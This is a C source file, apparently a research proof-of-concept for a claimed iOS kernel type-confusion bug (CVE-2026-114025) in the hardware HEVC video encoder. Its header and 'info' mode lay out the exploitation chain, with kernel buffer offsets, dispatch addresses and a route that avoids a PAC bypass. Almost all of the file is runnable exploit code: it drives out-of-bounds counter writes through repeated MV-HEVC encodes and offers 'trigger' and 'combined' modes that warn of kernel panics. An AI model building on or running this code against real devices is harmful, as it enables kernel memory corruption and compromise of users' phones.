/*
 * ave_type_confusion.c — CVE-2026-114025 Type Confusion via Value==2 Dispatch
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * SESSION 17 BREAKTHROUGH: The +0x5F94 dispatch site has a value==2 path that
 * passes buffer+0x5F98 (a kernel-valid pointer to our OOB-written data) through
 * multiple PAC-authenticated vtable calls. The pipeline processes OOB counter
 * entries AS IF they were HEVC parameter data — a type confusion.
 *
 * Key advantages over other paths:
 *   1. NO PAC bypass needed — uses real PAC-signed vtable methods
 *   2. NO PAN concern — pointer is to kernel heap (kalloc.49152), not user space
 *   3. Data is PARTIALLY CONTROLLED — layer_id (0-65535) becomes "parameter" values
 *
 * Entry 641 of VPS table 1 lands at buffer+0x5F90:
 *   +0x5F90: NAL_type (1-3)
 *   +0x5F94: layer_id → VALUE READ BY DISPATCH (must be 2 for this path)
 *   +0x5F98: cumsum → PASSED TO PIPELINE AS "PARAMETER DATA"
 *   +0x5F9C: size>>3 → PART OF "PARAMETER DATA"
 *
 * To reach entry 641, we need 641/3 ≈ 214 encodes.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOSurface -framework IOKit
 *        -o AVETypeConfusion ave_type_confusion.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avetypeconfusion
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile int g_cb_status = -999;
static volatile int g_cb_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
    if (status != 0) {
        rlog("  [CB#%d] ERROR status=%d flags=0x%x\n", g_cb_count, (int)status, (unsigned)flags);
    }
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_session(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("CREATE FAILED: %d\n", (int)st);
        return NULL;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int encode_n_frames(VTCompressionSessionRef session, int n, int w, int h) {
    int first_error = n;
    int errors = 0;

    for (int i = 0; i < n; i++) {
        CVPixelBufferRef pb = create_pb(w, h);
        if (!pb) {
            rlog("  [%d] pixel buffer creation failed\n", i);
            if (first_error == n) first_error = i;
            errors++;
            continue;
        }

        g_encode_done = 0;
        g_cb_status = -999;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st != noErr) {
            rlog("  [%d] EncodeFrame FAILED: %d (entries ~%d)\n", i, (int)st, i * 3);
            CVPixelBufferRelease(pb);
            if (first_error == n) first_error = i;
            errors++;
            if (errors >= 5) {
                rlog("  Too many errors at frame %d\n", i);
                break;
            }
            continue;
        }

        for (int w_i = 0; w_i < 100 && !g_encode_done; w_i++) usleep(10000);

        if (g_cb_status != 0 && g_cb_status != -999) {
            rlog("  [%d] callback error: %d (entries ~%d)\n", i, g_cb_status, i * 3);
            if (first_error == n) first_error = i;
            errors++;
        }

        CVPixelBufferRelease(pb);

        if ((i + 1) % 25 == 0 || i == 0 || (i >= 210 && i <= 220)) {
            rlog("  [frame %d] OK (entries ~%d, errors=%d)\n", i, (i+1)*3, errors);
        }
    }

    rlog("  Flushing...\n");
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);

    return first_error;
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_type_confusion.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Type Confusion Probe (Session 17) ===\n");
    rlog("Target: trigger value==2 dispatch at +0x5F94 via counter overflow\n");
    rlog("Entry 641 layer_id controls dispatch. 641/3 ≈ 214 encodes needed.\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "info";
    int W = 128, H = 128;

    if (strcmp(mode, "info") == 0) {
        rlog("\n== INFO: Exploitation chain overview ==\n");
        rlog("Entry 641 at buffer+0x5F90 (table 1):\n");
        rlog("  +0x5F90: NAL_type (1-3)\n");
        rlog("  +0x5F94: layer_id → dispatch control value\n");
        rlog("  +0x5F98: cumsum → becomes 'parameter data' pointer target\n");
        rlog("  +0x5F9C: size>>3 → part of 'parameter data'\n\n");
        rlog("Dispatch at 0x909b364:\n");
        rlog("  layer_id=0 or >=3: skip (safe)\n");
        rlog("  layer_id=1: BLRAA vtable[0x188](self, 4)\n");
        rlog("  layer_id=2: 5-level chain walk → vtable[0x1F0](self, X19, buf+0x5F98, ...)\n\n");
        rlog("Value==2 passes our OOB data through PAC-authenticated pipeline.\n");
        rlog("No PAN issue (kernel heap pointer). No PAC bypass needed.\n\n");
        rlog("Modes:\n");
        rlog("  safe      — 50 encodes with lid=2 (within bounds, no OOB)\n");
        rlog("  approach  — 200 encodes with lid=2 (approach entry 641)\n");
        rlog("  trigger   — 220 encodes with lid=2 (★ TRIGGERS VALUE==2 DISPATCH)\n");
        rlog("  value1    — 220 encodes with lid=1 (triggers value==1 BLRAA for comparison)\n");
        rlog("  combined  — 250 encodes with lid=2 (deep OOB + type confusion)\n");
        rlog("  measure   — 10 encodes, dump HEVC params to measure NAL sizes\n");

    } else if (strcmp(mode, "safe") == 0) {
        rlog("\n== SAFE: 50 encodes with layer_id=2 (within bounds) ==\n");
        rlog("50 * 3 = 150 entries, well within 256-entry boundary\n");
        VTCompressionSessionRef s = create_mvhevc_session(W, H, 2);
        if (s) {
            int fe = encode_n_frames(s, 50, W, H);
            rlog("Result: first_error=%d, callbacks=%d\n", fe, g_cb_count);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else if (strcmp(mode, "approach") == 0) {
        rlog("\n== APPROACH: 200 encodes with layer_id=2 ==\n");
        rlog("200 * 3 = 600 entries. Entry 641 NOT yet reached.\n");
        rlog("Tests survivability of OOB into firmware param zone.\n");
        VTCompressionSessionRef s = create_mvhevc_session(W, H, 2);
        if (s) {
            int fe = encode_n_frames(s, 200, W, H);
            rlog("Result: first_error=%d, callbacks=%d\n", fe, g_cb_count);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else if (strcmp(mode, "trigger") == 0) {
        rlog("\n== ★ TRIGGER: 220 encodes with layer_id=2 ==\n");
        rlog("220 * 3 = 660 entries. Entry 641 reached at ~214 encodes.\n");
        rlog("layer_id=2 at entry 641 → VALUE==2 DISPATCH TRIGGERED!\n");
        rlog("Buffer+0x5F98 passed through PAC-authenticated vtable pipeline.\n");
        rlog("WARNING: May cause kernel panic if secondary processing crashes.\n\n");
        VTCompressionSessionRef s = create_mvhevc_session(W, H, 2);
        if (s) {
            int fe = encode_n_frames(s, 220, W, H);
            rlog("Result: first_error=%d, callbacks=%d\n", fe, g_cb_count);
            if (fe == 220) {
                rlog("★ ALL 220 ENCODES SUCCEEDED — type confusion was processed!\n");
                rlog("The pipeline consumed our OOB data without crashing.\n");
                rlog("Next: check crash logs and try 'combined' for deeper OOB.\n");
            } else {
                rlog("Encode failed at frame %d (entry ~%d)\n", fe, fe * 3);
                rlog("Check panic logs for crash details.\n");
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else if (strcmp(mode, "value1") == 0) {
        rlog("\n== VALUE1: 220 encodes with layer_id=1 ==\n");
        rlog("Entry 641 layer_id=1 → triggers BLRAA vtable[0x188](self, 4)\n");
        rlog("Comparison test for value==1 path.\n");
        VTCompressionSessionRef s = create_mvhevc_session(W, H, 1);
        if (s) {
            int fe = encode_n_frames(s, 220, W, H);
            rlog("Result: first_error=%d, callbacks=%d\n", fe, g_cb_count);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else if (strcmp(mode, "combined") == 0) {
        rlog("\n== COMBINED: 250 encodes with layer_id=2 ==\n");
        rlog("250 * 3 = 750 entries. Deep into firmware param + type confusion.\n");
        rlog("Tests COMBINED effect: OOB data corruption + dispatch trigger.\n");
        rlog("WARNING: HIGH CRASH RISK.\n\n");
        VTCompressionSessionRef s = create_mvhevc_session(W, H, 2);
        if (s) {
            int fe = encode_n_frames(s, 250, W, H);
            rlog("Result: first_error=%d, callbacks=%d\n", fe, g_cb_count);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else if (strcmp(mode, "measure") == 0) {
        rlog("\n== MEASURE: 10 encodes, dump HEVC parameter sets ==\n");
        rlog("Determines actual NAL sizes for cumsum prediction.\n");

        VTCompressionSessionRef s = NULL;
        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                             kCFBooleanTrue);
        CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                             kCFBooleanTrue);

        /* Use a callback that dumps parameter sets */
        OSStatus st = VTCompressionSessionCreate(NULL, W, H,
            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
            /* Use simple callback, then read format description */
            encode_cb, NULL, &s);
        CFRelease(enc_spec);

        if (st != noErr || !s) {
            rlog("CREATE FAILED: %d\n", (int)st);
        } else {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);

            int base = 0, lid = 2;
            CFNumberRef ids[2];
            ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
            ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
            VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), arr);
            CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

            CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
            CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            VTSessionSetProperty(s, CFSTR("MVHEVCLeftEyeID"), left);
            VTSessionSetProperty(s, CFSTR("MVHEVCRightEyeID"), right);
            CFRelease(left); CFRelease(right);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)st);

            if (st == noErr) {
                for (int i = 0; i < 10; i++) {
                    CVPixelBufferRef pb = create_pb(W, H);
                    if (!pb) continue;
                    g_encode_done = 0;
                    CMTime pts = CMTimeMake(i, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    st = VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                    rlog("  [%d] encode: %d\n", i, (int)st);
                    for (int w_i = 0; w_i < 100 && !g_encode_done; w_i++) usleep(10000);
                    CVPixelBufferRelease(pb);
                }
                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                usleep(500000);
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

    } else {
        rlog("Usage: AVETypeConfusion <mode>\n");
        rlog("  info      — show exploitation chain overview\n");
        rlog("  safe      — 50 encodes (within bounds, baseline)\n");
        rlog("  approach  — 200 encodes (approach entry 641)\n");
        rlog("  trigger   — 220 encodes (★ TRIGGER value==2 dispatch)\n");
        rlog("  value1    — 220 encodes with lid=1 (comparison test)\n");
        rlog("  combined  — 250 encodes (deep OOB + type confusion)\n");
        rlog("  measure   — 10 encodes, dump HEVC params\n");
    }

    rlog("\n=== Type Confusion Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
